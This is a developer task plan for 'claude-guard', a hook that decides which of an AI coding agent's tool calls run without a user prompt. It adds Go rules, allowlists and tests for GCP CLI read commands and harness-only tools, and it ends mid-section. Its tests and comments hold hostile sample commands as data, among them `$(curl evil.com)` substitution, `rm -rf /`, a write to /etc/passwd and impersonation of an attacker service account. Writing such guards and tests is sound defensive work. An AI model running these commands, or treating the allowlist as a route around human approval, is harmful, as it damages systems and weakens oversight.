# Task: Fix claude-guard fallthroughs for non-Bash tools & GCP CLI read commands

**Created:** 2026-04-19
**Status:** Ready to execute (CTO review applied 2026-04-19)
**Context:** Two tier-2 gaps surfaced on 2026-04-19 that push safe, read-only operations to a user prompt. Both undermine the value proposition of claude-guard (deterministic allow for boring reads) without adding safety, and both are fixable without touching tier 1 / LLM / verifier.

## Background — what we observed

### Signal 1: non-Bash tools

Decision log (paraphrased):

```
tool_name=Agent                          tier=default  verdict=continue  latency=695µs
tool_name=mcp__ccd_session__mark_chapter tier=default  verdict=continue  latency=~700µs
tool_name=Read ... (CWD)                 tier=instant_allow read-cwd-scope
```

`Agent` and harness-only MCP servers (`ccd_session`, `scheduled-tasks`, `mcp-registry`) hit
[`decideGeneric`](../../internal/engine/tools.go:294) → `decideLLMFallback`. The only tier-2 heuristic
there is `mcpReadVerbs` prefix match, which fails on names like `mark_chapter`, `spawn_task`, `Agent`.
When the LLM tier is unavailable (see Signal 3), they drop straight to `continue`, so the user is
prompted for every one of them. When the LLM IS available, every one is a classifier round-trip
with no safety benefit — these tools have no shell / file / network surface.

### Signal 2: GCP CLI read verbs

```
command=gcloud iam service-accounts list --project=... --filter="..." --format="value(email)" 2>&1
tier=default  verdict=continue  latency=387µs
```

Three things stacked:
1. `gcloud` is deliberately excluded from tier-2 instant_allow (see
   [`defaults.go:423-433`](../../internal/config/defaults.go:423)) — the concern is that `gcloud projects
   delete` etc. would sneak through a program-only match.
2. Even if a rule existed, [`AnchoredCommand.Eval`](../../internal/rules/rules.go:84) rejects
   anything with `HasRedirect`, and `2>&1` is a redirect. Stderr-merge is a common, safe pattern for
   GCP commands (they dump auth warnings to stderr).
3. [`AnchoredCommand.RequireSubcmdAny`](../../internal/rules/rules.go:101) only checks the FIRST
   positional. `gcloud iam service-accounts list` has the verb 3 tokens deep.

Same applies to `gsutil ls`, `bq show`, `kubectl get pods`, etc. — GCP-heavy sessions drown in
user prompts.

### Signal 3 — investigate separately (not fixed in this plan)

`ANTHROPIC_API_KEY` is NOT inherited by the claude-guard subprocess under Claude Code (confirmed via
`launchctl getenv` and `[ -z "$ANTHROPIC_API_KEY" ]` from inside a hook test). Result:
`pickClassifierAndVerifier` returns `(nil, nil)` → LLM tier silently disabled.

This amplifies Signals 1 and 2 but is environmental. Fixing tier-2 coverage makes us robust to it,
but a separate task should investigate Claude Code's OAuth → subprocess env behaviour and surface a
louder warning in `doctor`. **Out of scope here**, noted in Failure Routing.

---

## Plan

1. [ ] Task 1 — Add `NestedSubcommandAllow` rule type (deep noun chain + stderr-merge redirect)
2. [ ] Task 2 — Seed GCP + related CLI defaults (gcloud, gsutil, bq, kubectl, firebase, terraform)
3. [ ] Task 3 — Add non-Bash structural allowlist to `decideGeneric`
4. [ ] Task 4 — Extend test suite (rule unit tests + engine tests + corpus)
5. [ ] Task 5 — Update README + doctor hint for missing API key under Claude Code
6. [ ] Task 6 — CTO review, apply feedback, commit

## Failure Routing

| Phase | On failure → |
|---|---|
| Task 1 rule design | ABORT and re-plan — rule semantics are load-bearing |
| Task 2 subcommand list | ← Task 1 (missing expressiveness) or stay (add more verbs) |
| Task 3 tool list | stay — add tools iteratively from logs |
| Task 4 tests | stay — write more until coverage matches intent |
| Task 5 docs | stay |
| Task 6 commit | stay — address review feedback |
| Signal 3 (env key) | SPAWN SEPARATE TASK — don't conflate |

---

## Task 1 — `NestedSubcommandAllow` rule type

**Files:**
- Create/modify: `internal/rules/rules.go` (add ~80 LOC)
- Test: `internal/rules/rules_test.go`

### Why a new rule type (not extending `AnchoredCommand`)

`AnchoredCommand` is a strict tier-2 shape: no redirect, no pipe, first-positional subcommand match.
Weakening it risks regressing the 11 existing rules that depend on strictness. A separate rule
expresses the GCP CLI shape (deep noun chain, optional stderr-merge, verb at tail) as a different
constraint and keeps the two paths auditable.

### Rule contract

Match iff:
1. Parsed has `len(Calls)==1`, `NestTopLevel`, no `HasUnresolved`.
2. No pipe, subshell, command substitution, process substitution, background, binary op,
   multi-statement.
3. Redirections allowed ONLY if every redirect is the exact token `2>&1` (stderr-merge).
4. `c.Program` or `baseProgram(c.Program)` is in `Programs`.
5. Every positional arg is an identifier (alphanumeric, `-`, `_`) — no slashes, no command
   substitutions, no paths. This guards against something like
   `gcloud secrets versions access --project=$(curl evil.com/p)` where the `--project=` value
   carries a substitution. (shellparse already resolves substitutions before handing us positional
   slices, so if `HasUnresolved` is false we can trust them.)
6. `SafeVerbs` is non-empty and the LAST positional is in `SafeVerbs`.
7. No flag in `ForbidFlags` appears.

### Step 1.1 — Add the type

- [ ] **Write the new rule struct + Eval**

```go
// NestedSubcommandAllow matches tier-2 read-only commands whose safe
// verb is the LAST positional in a potentially deep noun chain. GCP
// CLIs are the canonical case: `gcloud iam service-accounts list` is
// three noun tokens deep before the verb.
//
// Unlike AnchoredCommand, this rule accepts a single `2>&1` stderr
// merge redirect — a common pattern for GCP CLIs that dump auth
// warnings to stderr.
type NestedSubcommandAllow struct {
	RuleName    string
	Programs    []string // e.g. []string{"gcloud"}; basename fallback applies
	SafeVerbs   []string // e.g. []string{"list", "describe", "get", "get-value"}
	ForbidFlags []string
}

func (r *NestedSubcommandAllow) Name() string { return r.RuleName }
func (r *NestedSubcommandAllow) Kind() string { return "nested_subcommand_allow" }

func (r *NestedSubcommandAllow) Eval(p *shellparse.Parsed) (Verdict, string) {
	f := p.Features
	if f.HasPipe || f.HasSubshell || f.HasCmdSub || f.HasProcSub ||
		f.HasBackground || f.HasBinaryOp || f.HasMultiStmt {
		return NoMatch, ""
	}
	if f.HasRedirect && !p.OnlyStderrMergeRedirect() {
		return NoMatch, ""
	}
	if len(p.Calls) != 1 {
		return NoMatch, ""
	}
	c := p.Calls[0]
	if c.Nesting != shellparse.NestTopLevel || c.HasUnresolved {
		return NoMatch, ""
	}
	if !stringIn(c.Program, r.Programs) && !stringIn(baseProgram(c.Program), r.Programs) {
		return NoMatch, ""
	}
	if len(c.Positional) == 0 {
		return NoMatch, ""
	}
	for _, pos := range c.Positional {
		if !isSafeIdentifier(pos) {
			return NoMatch, ""
		}
	}
	last := c.Positional[len(c.Positional)-1]
	if !stringIn(last, r.SafeVerbs) {
		return NoMatch, ""
	}
	for _, forbidden := range r.ForbidFlags {
		if anchoredFlagForbidden(c.Flags, forbidden) {
			return NoMatch, ""
		}
	}
	return Match, r.RuleName
}

// isSafeIdentifier returns true when s is a bare identifier
// (letters, digits, `-`, `_`, `.`). Blocks path traversal, command
// substitution remnants, etc. in positional args.
func isSafeIdentifier(s string) bool {
	if s == "" {
		return false
	}
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z',
			r >= 'A' && r <= 'Z',
			r >= '0' && r <= '9',
			r == '-', r == '_', r == '.':
		default:
			return false
		}
	}
	return true
}
```

- [ ] **Add shellparse helper `OnlyStderrMergeRedirect()`** — structural path only.

**Verified (2026-04-19, CTO review):** `shellparse.Parsed` does NOT retain a typed `Redirects`
slice today; only the boolean `HasRedirect` feature flag. The helper must walk the underlying
`*syntax.File` AST via `syntax.Walk`, inspect each `*syntax.Redirect` node, and verify every op
is exactly `2>&1` (duplicate-fd: `Op==DplOut` with `Word.Lit()=="1"`, `N==2`, no `Hdoc`).

**BANNED fallback:** `strings.Contains(rawCmd, "2>&1")`. Unsafe — passes for
`echo "2>&1" > /etc/passwd`. If the structural walk is infeasible, the rule type does not ship
in this plan.

```go
// In internal/shellparse/shellparse.go (or new redirects.go):

// OnlyStderrMergeRedirect returns true iff the parsed script has at
// least one redirect AND every redirect is exactly `2>&1` (merge
// fd 2 into fd 1). No file writes, no hdocs, no fd dups to other
// targets. Walks p.File.Stmts via syntax.Walk — Parsed currently
// does not retain a typed []Redirect slice.
func (p *Parsed) OnlyStderrMergeRedirect() bool {
	if !p.Features.HasRedirect || p.File == nil {
		return false
	}
	ok := true
	syntax.Walk(p.File, func(n syntax.Node) bool {
		r, isRedir := n.(*syntax.Redirect)
		if !isRedir {
			return true
		}
		// `2>&1`: Op == DplOut, N.Value == "2", Word literal == "1",
		// no Hdoc.
		if r.Op != syntax.DplOut {
			ok = false
			return false
		}
		if r.N == nil || r.N.Value != "2" {
			ok = false
			return false
		}
		if r.Hdoc != nil || r.Word == nil || r.Word.Lit() != "1" {
			ok = false
			return false
		}
		return true
	})
	return ok
}
```

- [ ] **Add unit test in `shellparse` package** covering: `cmd 2>&1` (true),
      `cmd > /tmp/out 2>&1` (false — file redirect), `cmd > /dev/null` (false),
      `cmd 2>/tmp/err` (false), `echo "2>&1"` (false — no redirect), `cmd` (false — no redirect).

- [ ] **Run `go test ./internal/rules/... -run NestedSubcommandAllow -v`** → expect fail (type
      doesn't exist yet for `go vet` if tests written first).

### Step 1.2 — Unit tests

- [ ] **Add test** `TestNestedSubcommandAllow` to `rules_test.go`:

```go
func TestNestedSubcommandAllow(t *testing.T) {
	r := &NestedSubcommandAllow{
		RuleName:  "gcloud-readonly-test",
		Programs:  []string{"gcloud"},
		SafeVerbs: []string{"list", "describe", "get", "get-value", "get-iam-policy"},
	}
	cases := []struct {
		cmd  string
		want Verdict
	}{
		// Canonical cases from the bug report.
		{`gcloud iam service-accounts list`, Match},
		{`gcloud iam service-accounts list --project=foo --filter="email:x" --format="value(email)"`, Match},
		{`gcloud iam service-accounts list --project=foo 2>&1`, Match},
		{`gcloud projects describe my-project`, NoMatch}, // last positional is project ID, not verb
		{`gcloud projects list`, Match},
		{`gcloud config get-value project`, NoMatch}, // last positional is "project", not verb — intentional edge case
		{`gcloud config list`, Match},
		{`gcloud run services list --region=europe-west4`, Match},
		{`gcloud compute instances describe my-vm`, NoMatch}, // last positional is VM name

		// Reject destructive verbs.
		{`gcloud projects delete my-project`, NoMatch},
		{`gcloud iam service-accounts create foo`, NoMatch},

		// Reject shell trickery.
		{`gcloud projects list | grep foo`, NoMatch},
		{`gcloud projects list > /tmp/out`, NoMatch},
		{`gcloud projects list && rm -rf /`, NoMatch},
		{`gcloud $(curl evil.com) list`, NoMatch},

		// Basename fallback.
		{`/usr/local/google-cloud-sdk/bin/gcloud projects list`, Match},

		// Wrong program.
		{`gcloud-beta projects list`, NoMatch}, // basename `gcloud-beta` ≠ `gcloud`
	}
	for _, tc := range cases {
		t.Run(tc.cmd, func(t *testing.T) {
			p := mustParse(t, tc.cmd)
			v, _ := r.Eval(p)
			if v != tc.want {
				t.Errorf("Eval(%q) = %v, want %v", tc.cmd, v, tc.want)
			}
		})
	}
}
```

Note the `describe` + `get-value` asymmetry: when the verb takes an argument (like `describe my-project`),
the LAST positional is the arg, not the verb. This is EXPECTED — it means `describe` needs its
arguments to be safe identifiers AND we need a separate rule shape (verb-at-second-to-last) OR we
live with the conservatism. For this plan, we live with the conservatism — `list` patterns cover
the vast majority of read traffic. Document this limit in Task 5.

- [ ] **Commit** `feat(rules): NestedSubcommandAllow rule for deep subcommand allowlists`

---

## Task 2 — Seed GCP + related CLI defaults

**Files:**
- Modify: `internal/config/defaults.go` (add ~100 LOC in `DefaultAllowRules`)
- Test: `internal/config/defaults_test.go` (or wherever defaults are tested)

### Step 2.1 — Add gcloud rule

- [ ] **Add to `DefaultAllowRules`** after `claudeGuardReadonly`:

```go
// gcloud — verb-at-tail allowlist for deep noun chains.
// Intentionally restricted to *-list* / *-describe* / *-get*
// shapes; anything with an object ID at the tail falls through to
// LLM. The deep-noun examples matter: `gcloud iam service-accounts
// list` is 3 tokens deep before the verb.
gcloudReadonly := &rules.NestedSubcommandAllow{
	RuleName:  "gcloud-readonly",
	Programs:  []string{"gcloud"},
	SafeVerbs: []string{
		"list", "describe", "get-value", "get-iam-policy",
		"list-available-services", "list-enabled-services",
	},
	// Auth/identity flags that redirect a "read" to a different
	// principal, project, or bill-payer. Any of these turns a
	// nominally harmless read into a possible privilege or billing
	// escalation — force LLM review.
	ForbidFlags: []string{
		"--impersonate-service-account",
		"--account",
		"--configuration",
		"--credential-file-override",
		"--billing-project",
		"--access-token-file",
	},
}
```

### Step 2.2 — Add gsutil rule

- [ ] **Add**:

```go
// gsutil — list/cat/stat are read. cp/mv/rm/rsync are write.
// gsutil's noun tree is shallow (verb is ALWAYS the first positional).
// Reuse AnchoredCommand, not NestedSubcommandAllow, because of this.
gsutilReadonly := &rules.AnchoredCommand{
	RuleName: "gsutil-readonly",
	Programs: []string{"gsutil"},
	RequireSubcmdAny: []string{
		"ls", "cat", "stat", "du", "hash", "help", "version",
		"acl", // `gsutil acl get` — write shape is `acl set`; LLM refines
	},
}
```

Acknowledge: `gsutil acl` is a noun that takes both `get` and `set` verbs. This rule will match
`gsutil acl set` too. Need a second-positional verb check. Options:
1. Use `NestedSubcommandAllow` with `SafeVerbs=["ls","cat","stat","du","hash","help","version"]`
   and accept that `acl get` falls through (tolerable — rare).
2. Add a forbid-positional mechanism. Over-engineered for 2026-04-19 scope.

**Decision**: option 1. Use `NestedSubcommandAllow` for gsutil too, with the single-verb subset. Drop
`acl` from the list.

```go
gsutilReadonly := &rules.NestedSubcommandAllow{
	RuleName:  "gsutil-readonly",
	Programs:  []string{"gsutil"},
	SafeVerbs: []string{"ls", "cat", "stat", "du", "hash", "help", "version"},
}
```

### Step 2.3 — Add bq rule

- [ ] **Add**:

```go
// bq — BigQuery CLI. Read verbs are unambiguous (show, ls, head,
// query with --dry_run). `bq query` without --dry_run is a write
// (charges the project); leave it to LLM.
bqReadonly := &rules.NestedSubcommandAllow{
	RuleName:  "bq-readonly",
	Programs:  []string{"bq"},
	SafeVerbs: []string{"ls", "show", "head", "help", "version"},
}
```

### Step 2.4 — Add kubectl rule

- [ ] **Add**:

```go
// kubectl — get/describe/logs/top/explain/api-resources are
// unambiguous reads. Exec/apply/delete/patch/edit/scale are writes.
kubectlReadonly := &rules.NestedSubcommandAllow{
	RuleName:  "kubectl-readonly",
	Programs:  []string{"kubectl"},
	SafeVerbs: []string{
		"get", "describe", "logs", "top", "explain",
		"api-resources", "api-versions", "version", "cluster-info",
		"config", // `kubectl config get-contexts` etc. — still conservative; falls through to LLM
	},
}
```

Same caveat as gsutil `acl`: `kubectl config` has both get and set shapes. Drop `config` to be
safe.

### Step 2.5 — Add firebase + terraform

- [ ] **Add** (minimal — these are infrequent):

```go
firebaseReadonly := &rules.NestedSubcommandAllow{
	RuleName:  "firebase-readonly",
	Programs:  []string{"firebase"},
	SafeVerbs: []string{"list", "projects:list", "apps:list", "help", "version"},
}

terraformReadonly := &rules.NestedSubcommandAllow{
	RuleName:  "terraform-readonly",
	Programs:  []string{"terraform"},
	SafeVerbs: []string{"plan", "validate", "fmt", "show", "output", "version", "providers", "state", "workspace"},
}
```

Caveats:
- `terraform plan` without `-out=` is read; with `-out=tfplan` it creates a file. Considered safe.
- `terraform state` has read + write verbs — for now accepting the conservatism of allowing `state` as the last
  positional (falls through to LLM for `terraform state list|show|rm`).

Rethink: `terraform state list` passes because `list` is in SafeVerbs. `terraform state rm` doesn't
because `rm` is not in SafeVerbs. Good — the contract handles it correctly.

### Step 2.6 — Register in `DefaultAllowRules`

- [ ] **Append all seven to the returned slice** and to the pipe-source allowlist.

```go
return []rules.Rule{
	posixReadonly,
	// ...existing...
	claudeGuardReadonly,
	gcloudReadonly,
	gsutilReadonly,
	bqReadonly,
	kubectlReadonly,
	firebaseReadonly,
	terraformReadonly,
	// ...existing continues...
}
```

- [ ] **Run tests**: `go test ./internal/config/...` — expect pass.
- [ ] **Commit** `feat(defaults): allow GCP CLI read verbs (gcloud/gsutil/bq/kubectl/firebase/terraform)`

---

## Task 3 — Non-Bash structural allowlist

**Files:**
- Modify: `internal/engine/tools.go` (add ~40 LOC)
- Test: `internal/engine/tools_test.go`

### Step 3.1 — Define safe-tool matcher

- [ ] **Add to `tools.go`, above `decideGeneric`**:

```go
// safeBuiltinTools are first-party Claude Code tools that have no
// shell / file / network side effects. Agent spawns subagents that
// re-enter the hook for every inner tool call (verified 2026-04-19:
// decision log contains 1179 entries with agent_id set, each being
// a subagent's inner call that triggered PreToolUse — so auto-
// allowing the outer Agent call is not a bypass); ToolSearch loads
// tool schemas; TodoWrite is local state. None reach outside the
// harness.
var safeBuiltinTools = map[string]bool{
	"Agent":      true,
	"ToolSearch": true,
	"TodoWrite":  true,
}

// safeMCPServerPrefixes match MCP servers whose entire surface is
// harness-internal (UI markers, session state, tool discovery). All
// tools under these servers are auto-allowed at tier 2.
//
// DO NOT add servers that touch external systems (gdrive, google-calendar,
// atlassian, etc.) — those can have write shapes and need LLM review.
//
// Deliberately omitted: `mcp__scheduled-tasks__` — create_scheduled_task
// persists intent across sessions, which is a real side effect. Leave
// to LLM tier.
var safeMCPServerPrefixes = []string{
	"mcp__ccd_session__",   // session markers (mark_chapter, spawn_task — spawn creates a new session, but the spawned session re-enters PreToolUse for every action, so the marker itself is safe)
	"mcp__mcp-registry__",  // server discovery (search_mcp_registry)
}

// isStructurallySafeTool reports whether a tool name is known safe
// without further analysis.
func isStructurallySafeTool(toolName string) (bool, string) {
	if safeBuiltinTools[toolName] {
		return true, "safe-builtin-tool"
	}
	for _, p := range safeMCPServerPrefixes {
		if strings.HasPrefix(toolName, p) {
			return true, "safe-mcp-server"
		}
	}
	return false, ""
}
```

### Step 3.2 — Wire into decideGeneric

- [ ] **Modify `decideGeneric`** to check the allowlist FIRST:

```go
func (e *Engine) decideGeneric(in Input, start time.Time) Output {
	out := Output{Verdict: Continue, Tier: "default"}

	// Tier-2: structural safe-tool allowlist.
	if ok, rule := isStructurallySafeTool(in.ToolName); ok {
		if !e.cfg.ShadowMode {
			out.Verdict = Allow
			out.Tier = "instant_allow"
			out.Rule = rule
			out.Reason = "tool is structurally safe (no shell/file/network surface)"
			out.Latency = time.Since(start)
			e.record(in, out)
			return out
		}
		out.Shadow.Tier2Rule = rule
	}

	// Tier-2: MCP read-verb heuristic (existing).
	action := extractMCPAction(in.ToolName)
	// ...existing code unchanged...
}
```

### Step 3.3 — Tests

- [ ] **Add tests** to `tools_test.go`:

```go
func TestDecideGeneric_AgentAutoAllows(t *testing.T) {
	e, _ := newTestEngine(t, false)
	out := e.Decide(Input{
		ToolName: "Agent",
		Command:  `MCP tool call (not bash) Agent: {"description":"..."}`,
		CWD:      "/tmp",
	})
	if out.Verdict != Allow {
		t.Errorf("Verdict = %v, want Allow for Agent tool", out.Verdict)
	}
	if out.Rule != "safe-builtin-tool" {
		t.Errorf("Rule = %q, want safe-builtin-tool", out.Rule)
	}
}

func TestDecideGeneric_CCDSessionMarkChapterAutoAllows(t *testing.T) {
	e, _ := newTestEngine(t, false)
	out := e.Decide(Input{
		ToolName: "mcp__ccd_session__mark_chapter",
		Command:  `MCP tool call (not bash) mcp__ccd_session__mark_chapter: {"title":"..."}`,
		CWD:      "/tmp",
	})
	if out.Verdict != Allow {
		t.Errorf("Verdict = %v, want Allow for harness-only MCP", out.Verdict)
	}
	if out.Rule != "safe-mcp-server" {
		t.Errorf("Rule = %q, want safe-mcp-server", out.Rule)
	}
}

func TestDecideGeneric_GdriveWriteStillFallsThrough(t *testing.T) {
	e, _ := newTestEngine(t, false)
	// gdrive has external side effects — must NOT be in the safe prefix list.
	out := e.Decide(Input{
		ToolName: "mcp__gdrive__gdrive_update_sheet",
		Command:  `MCP tool call (not bash) mcp__gdrive__gdrive_update_sheet: {}`,
		CWD:      "/tmp",
	})
	if out.Verdict != Continue {
		t.Errorf("Verdict = %v, want Continue (no LLM) for gdrive write", out.Verdict)
	}
}

func TestDecideGeneric_ScheduledTasksFallsThrough(t *testing.T) {
	e, _ := newTestEngine(t, false)
	// scheduled-tasks persists intent across sessions — NOT in safe prefixes.
	out := e.Decide(Input{
		ToolName: "mcp__scheduled-tasks__create_scheduled_task",
		Command:  `MCP tool call (not bash) mcp__scheduled-tasks__create_scheduled_task: {}`,
		CWD:      "/tmp",
	})
	if out.Verdict == Allow {
		t.Errorf("Verdict = Allow for create_scheduled_task — must fall through to LLM")
	}
}

// TestDecideGeneric_AgentReentryAssumption documents the load-bearing
// claim that makes auto-allow safe: every subagent inner tool call
// re-enters PreToolUse, so the guard still sees everything the
// subagent does. The decision log's agent_id field is populated for
// exactly these re-entries. This test asserts that when a subagent
// Bash call arrives with agent_id set, the engine processes it like
// any other Bash call — confirming the hook fires for inner calls.
func TestDecideGeneric_AgentReentryAssumption(t *testing.T) {
	e, _ := newTestEngine(t, false)
	// Simulate a subagent Bash call — should be evaluated by Bash
	// pipeline (not short-circuited by being "from an agent").
	out := e.Decide(Input{
		ToolName:  "Bash",
		Command:   "rm -rf /",
		CWD:       "/tmp",
		AgentID:   "abc123",
		AgentType: "Explore",
	})
	if out.Verdict != Deny {
		t.Errorf("Verdict = %v, want Deny — subagent Bash calls MUST be evaluated normally", out.Verdict)
	}
}
```

- [ ] **Run**: `go test ./internal/engine/... -run DecideGeneric -v` — expect all pass.
- [ ] **Commit** `feat(engine): structural allowlist for safe non-Bash tools`

---

## Task 4 — Extend test suite (integration + corpus)

**Files:**
- Modify: `internal/corpus/testdata/bash_allow.txt` (add GCP examples)
- Modify: `internal/corpus/testdata/bash_continue.txt` (add edge cases)
- Modify: `internal/engine/golden_test.go` (if exists — verify new rules reflected in golden)

### Step 4.1 — Corpus additions

Gotcha: `NestedSubcommandAllow` requires every positional to be a safe identifier (no `:`, no `/`,
no `gs://`). So `gsutil ls gs://my-bucket` will NOT match — the tail positional `gs://my-bucket`
fails `isSafeIdentifier`. Entries below reflect that constraint (use `gsutil ls` bare, or `bq show
my-dataset.my-table` where `.` is allowed).

Similarly: `gcloud config get-value project` has tail `project` — not in SafeVerbs — falls through.
This is by design (see Known Limits in README). Use `gcloud config list` instead for the allow
case.

- [ ] **Append to `bash_allow.txt`**:

```
gcloud projects list
gcloud iam service-accounts list --project=my-proj
gcloud iam service-accounts list --project=my-proj 2>&1
gcloud compute instances list --zones=europe-west4-a
gcloud run services list --region=europe-west4
gcloud config list
gcloud auth list
gsutil ls
bq ls
kubectl get pods
kubectl describe pods
kubectl logs
terraform plan
terraform validate
```

- [ ] **Append to `bash_continue.txt`** (must NOT auto-allow):

```
gcloud projects delete my-project
gcloud iam service-accounts create new-sa
gcloud run deploy my-service --image=gcr.io/foo/bar
gcloud auth login
gsutil cp /tmp/foo gs://my-bucket/
gsutil rm gs://my-bucket/foo
bq query --use_legacy_sql=false "DROP TABLE foo"
kubectl apply -f manifest.yaml
kubectl delete pod my-pod
terraform apply
terraform destroy
gcloud projects list | xargs -I{} gcloud projects delete {}
gcloud projects list > /tmp/out
gcloud projects list --impersonate-service-account=attacker@evil.iam.gserviceaccount.com
```

### Step 4.2 — Run corpus tests

- [ ] **Run**: `go test ./internal/corpus/... -v`
- [ ] If corpus test runner doesn't exist, check whether defaults tests include a
      "all entries in bash_allow.txt hit instant_allow" check. If not, add one:

```go
func TestCorpus_BashAllow(t *testing.T) {
	b, err := os.ReadFile("testdata/bash_allow.txt")
	if err != nil { t.Fatal(err) }
	cfg := config.Default()
	e := engine.New(cfg, nil)
	for _, line := range strings.Split(string(b), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") { continue }
		t.Run(line, func(t *testing.T) {
			out := e.Decide(engine.Input{ToolName: "Bash", Command: line, CWD: "/tmp"})
			if out.Verdict != engine.Allow {
				t.Errorf("Verdict = %v (tier=%s rule=%s), want Allow", out.Verdict, out.Tier, out.Rule)
			}
		})
	}
}
```

- [ ] **Commit** `test(corpus): GCP CLI read/write coverage`

### Step 4.3 — End-to-end integration test

Unit tests cover the engine's `Decide()` method in-process. They don't catch wiring bugs in
`cmd/claude-guard/decide.go` (JSON parsing, env handling, stdout response shape). Add one
exec-based test per CTO feedback I4.

**Files:**
- Create: `cmd/claude-guard/decide_integration_test.go`

- [ ] **Add test**:

```go
//go:build integration

package main

import (
	"bytes"
	"encoding/json"
	"os/exec"
	"path/filepath"
	"testing"
)

// TestDecideBinary_StructuralAllowForAgent verifies the full path:
// PreToolUse JSON on stdin → engine decide → HookOutput on stdout.
// Uses `go run .` so we don't depend on a built binary.
func TestDecideBinary_StructuralAllowForAgent(t *testing.T) {
	payload := map[string]any{
		"tool_name":  "Agent",
		"tool_input": map[string]any{"description": "x", "prompt": "y"},
		"cwd":        t.TempDir(),
	}
	buf, _ := json.Marshal(payload)

	cmd := exec.Command("go", "run", ".", "decide")
	cmd.Stdin = bytes.NewReader(buf)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	cmd.Dir = filepath.Join("..", "..", "cmd", "claude-guard")
	if err := cmd.Run(); err != nil {
		t.Fatalf("decide exited non-zero: %v\nstderr: %s", err, stderr.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(stdout.Bytes(), &resp); err != nil {
		t.Fatalf("invalid JSON on stdout: %v\nraw: %s", err, stdout.String())
	}
	// Expect hookSpecificOutput.permissionDecision == "allow".
	hso, _ := resp["hookSpecificOutput"].(map[string]any)
	if hso["permissionDecision"] != "allow" {
		t.Errorf("permissionDecision = %v, want allow — Agent should auto-allow\nresp: %s", hso["permissionDecision"], stdout.String())
	}
}
```

- [ ] **Run**: `go test -tags=integration ./cmd/claude-guard/... -run Integration -v`
- [ ] **Update Makefile's `check` target** to invoke the integration build tag too, OR add a
      separate `make check-integration` and document in README.

---

## Task 5 — Docs

**Files:**
- Modify: `README.md`
- Modify: `cmd/claude-guard/doctor.go` (add a specific hint)

### Step 5.1 — README

- [ ] **Update the "What it does" section** to reflect non-Bash scope. Current claim is "Runs as a
      `PreToolUse` hook on the `Bash` tool." — stale.

```markdown
## What it does

Runs as a `PreToolUse` hook on every tool Claude Code invokes. Each tool is routed to a dedicated evaluator:

- **Bash** — shell AST analysis (tier 1 block / tier 2 allow / LLM fallback).
- **Read / Write / Edit** — CWD scope + secret scan + protected-path deny.
- **WebFetch / WebSearch** — SSRF and URL shape checks.
- **Agent / MCP** — structural allowlist for harness-only tools; read-verb heuristic for other MCPs.
- Everything else — LLM fallback.
```

- [ ] **Add a "Known limits" subsection** noting:
  - `NestedSubcommandAllow` only matches when the LAST positional is a safe verb — so
    `gcloud projects describe my-project` falls through because `my-project` is the tail.
  - When no LLM API key is present in the subprocess, tier 4 is silently disabled. Commands that
    need the LLM tier then fall through to `continue` and the user is prompted.

### Step 5.2 — doctor hint

- [ ] **Upgrade the doctor warning** to ERROR-level when `CLAUDECODE=1` is set (per CTO feedback
      I1 — under Claude Code a missing key silently disables tier 4, which is a correctness issue,
      not a soft warning):

```go
// In doctor.go where the "no API key" warning is emitted:
if os.Getenv("CLAUDECODE") != "" {
	// Under Claude Code this is load-bearing: OAuth does not expose
	// an API key to subprocesses, so the hook's LLM tier silently
	// disables. Commands that need LLM review fall through to a
	// user prompt. Error, not warn.
	errf("llm:provider",
		"no ANTHROPIC_API_KEY / GEMINI_API_KEY in claude-guard subprocess env. Claude Code "+
		"uses OAuth and does NOT export an API key to subprocesses — LLM tier is disabled. "+
		"Commands that don't match tier 1/2 rules will fall through to a user prompt. Fix: "+
		"export ANTHROPIC_API_KEY in your shell profile or .envrc, OR rely on tier-2 "+
		"structural rules only.")
} else {
	warn("llm:provider", "no API key in env (set ANTHROPIC_API_KEY or GEMINI_API_KEY)")
}
```

If `doctor.go` doesn't have an `errf` helper today, add one in the same commit — mirrors `warn`
but prints `[err]` prefix and makes the overall status "ERROR" instead of "OK".

- [ ] **Commit** `docs(readme,doctor): reflect non-Bash scope and Claude Code env-key behaviour`

---

## Task 6 — CTO review, apply feedback, commit

- [ ] Request CTO review via `code-reviewer` agent.
- [ ] Apply feedback (if any).
- [ ] Verify: `make check` (fmt + vet + test -race).
- [ ] Commit with message `feat(rules,engine): non-Bash safe allowlist + GCP CLI read verbs`.
- [ ] Push to a feature branch, open PR, monitor CTO bot review.

Allowed commands for uninterrupted agent execution:
- `go test ./...`, `go vet ./...`, `gofmt`, `go build ./...`, `make check`
- `git status`, `git diff`, `git log`, `git add`, `git commit`, `git push`
- `gh pr create`, `gh pr view`, `gh pr checks`
- `grep`, `find`, file reads/writes within the repo

No manual deploy. No `gcloud` needed. No destructive commands.

## Out-of-scope followups (captured for later)

1. **ANTHROPIC_API_KEY not inherited under Claude Code** — investigate Claude Code's subprocess env
   behaviour, document in README or propose token-vault as the durable answer.
2. **Describe-with-arg verb shape** — `gcloud projects describe my-project` isn't covered by this
   plan's rule type. Options: positional-count-aware rule, or explicit second-to-last matching.
   Tolerate the conservatism until log data justifies the complexity.
3. **Per-project config to extend the GCP verb list** — users in kubectl-heavy repos may want
   `config get-contexts` auto-allowed. Defer until requested.

## Notes

### 2026-04-19 — Discovery
Investigation of two log lines led to three stacked issues (non-Bash fallthrough, gcloud read
fallthrough, missing LLM key under Claude Code). Rule type `NestedSubcommandAllow` chosen over
extending `AnchoredCommand` to preserve auditability of the strict tier-2 shape.

## Files Modified
- `internal/rules/rules.go` — add `NestedSubcommandAllow` + `isSafeIdentifier`
- `internal/rules/rules_test.go` — add `TestNestedSubcommandAllow`
- `internal/shellparse/shellparse.go` (or new `redirects.go`) — add structural `OnlyStderrMergeRedirect` + unit tests
- `internal/config/defaults.go` — add gcloud / gsutil / bq / kubectl / firebase / terraform rules
- `internal/engine/tools.go` — structural allowlist for safe non-Bash tools
- `internal/engine/tools_test.go` — tests for new allowlist + subagent re-entry assumption + scheduled-tasks fallthrough
- `internal/corpus/testdata/bash_allow.txt` — GCP CLI read examples
- `internal/corpus/testdata/bash_continue.txt` — GCP CLI write examples
- `cmd/claude-guard/decide_integration_test.go` — end-to-end binary test (integration build tag)
- `README.md` — scope + known-limits update
- `cmd/claude-guard/doctor.go` — `CLAUDECODE=1` error-level hint for missing API key

## Review Applied (2026-04-19)

CTO review via `superpowers:code-reviewer` returned 2 blockers and 4 important items. All
addressed in this plan before execution:

